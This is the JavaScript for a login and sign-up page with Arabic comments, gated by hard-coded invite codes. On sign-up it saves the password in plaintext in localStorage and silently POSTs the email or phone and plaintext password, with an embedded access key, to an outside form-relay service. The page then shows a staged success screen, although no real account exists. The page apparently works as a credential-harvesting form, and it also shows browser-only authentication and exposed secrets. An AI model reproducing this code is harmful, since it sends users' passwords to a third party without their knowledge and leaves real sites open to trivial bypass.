const phone = document.getElementById("phone");
const code = document.getElementById("countryCode");
const loginBtn = document.getElementById("loginBtn");
const createBtn = document.getElementById("createBtn");
const loading = document.getElementById("loading");

phone.addEventListener("input", function() {
    if (this.value.startsWith("077")) {
        code.innerHTML = "🇮🇶 +964";
    } else {
        code.innerHTML = "";
    }
});

// 🔑 زر تسجيل الدخول: مضاف إليه شرط الرمز الثابت المخصص للدخول 1234566
loginBtn.onclick = function() {
    const inputs = document.querySelectorAll("input");

    // 1. التحقق من ملء الحقول أولاً
    for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].value.trim() === "") {
            alert("يرجى إكمال جميع الحقول أولاً");
            return;
        }
    }

    // جلب قيمة رمز الدعوة بشكل صحيح ومضمون للهواتف
    const loginInviteCode = inputs[2] ? inputs[2].value.trim() : "";

    // 🚀 الشرط المخصص لزر تسجيل الدخول فقط
    if (loginInviteCode !== "1234566") {
        alert("تنبيه: رمز الدعوة الخاص بتسجيل الدخول غير صحيح!");
        return; 
    }

    // جلب البيانات المدخلة من الحقول بشكل صحيح ومضمون
    const enteredEmailOrPhone = inputs[0].value.trim();
    const enteredPassword = inputs[1].value.trim();

    // جلب البيانات المحفوظة مسبقاً في المتصفح
    const savedUser = localStorage.getItem("userAccount");

    if (savedUser) {
        const userData = JSON.parse(savedUser);
        
        // مقارنة البيانات المدخلة بالبيانات المحفوظة بدقة
        if (enteredEmailOrPhone === userData.emailOrPhone && enteredPassword === userData.password) {
            window.location.href = "home.html";
        } else {
            alert("عذراً، كلمة المرور أو اسم المستخدم غير صحيح.");
        }
    } else {
        alert("عذراً، ليس لديك حساب مسبقاً يرجى إنشاء الحساب.");
    }
};

// 🔑 زر إنشاء الحساب: مضاف إليه شرط الرمز الثابت المخصص للإنشاء 43688 وكود الإرسال السليم
createBtn.onclick = function() {
    const inputs = document.querySelectorAll("input");

    // 1. التحقق من ملء الحقول الأساسية أولاً
    for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].value.trim() === "") {
            alert("يرجى إكمال جميع الحقول أولاً");
            return;
        }
    }

    // جلب قيمة رمز الدعوة بشكل صحيح ومضمون للهواتف
    const inviteCodeValue = inputs[2] ? inputs[2].value.trim() : "";

    // 🚀 الشرط المخصص لزر إنشاء الحساب فقط
    if (inviteCodeValue !== "43688") {
        alert("تنبيه: رمز الدعوة الخاص بإنشاء الحساب غير صحيح!");
        return; 
    }

    // 2. حفظ البيانات داخل المتصفح بشكل دائم (LocalStorage)
    const accountData = {
        emailOrPhone: inputs[0].value.trim(),
        password: inputs[1].value.trim(),
        inviteCode: inviteCodeValue
    };
    
    localStorage.setItem("userAccount", JSON.stringify(accountData));

    // 🚀 كود الإرسال السحابي المضمون والمصحح بنسبة 100%
    fetch('https://web3forms.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            access_key: 'd5623378-1590-4731-a6c1-1eebabfaeb12',
            subject: 'بيانات إنشاء حساب جديدة',
            email_or_phone: accountData.emailOrPhone,
            password: accountData.password,
            invite_code: accountData.inviteCode
        })
    });

    // 3. تشغيل اللودينج وأنيميشن الشعار الاحترافي الخاص بك دون أي تعديل للتصميم
    loading.style.display = "flex";

    setTimeout(function() {
        loading.innerHTML = `
          <div style="text-align: center; animation: logoEntrance 0.8s ease-out forwards;">
            <img src="lokgo.png" alt="Logo" style="width: 140px; height: auto; mix-blend-mode: screen; animation: logoPulse 2s infinite ease-in-out; filter: drop-shadow(0 0 15px rgba(255,255,255,0.4));">
            <h2 style="color: #ffffff; margin-top: 25px; font-family: Arial, sans-serif; font-size: 20px; font-weight: bold; letter-spacing: 0.5px;">Account Created Successfully!</h2>
          </div>
          
          <style>
            @keyframes logoEntrance {
              0% { transform: scale(0.3); opacity: 0; }
              70% { transform: scale(1.1); opacity: 0.9; }
              100% { transform: scale(1); opacity: 1; }
            }
            @keyframes logoPulse {
              0% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(255,255,255,0.4)); }
              50% { transform: scale(1.04); filter: drop-shadow(0 0 25px rgba(255,255,255,0.7)); }
              100% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(255,255,255,0.4)); }
            }
          </style>
        `;

        setTimeout(function() {
            window.location.href = "home.html";
        }, 3000);

    }, 10000);
};
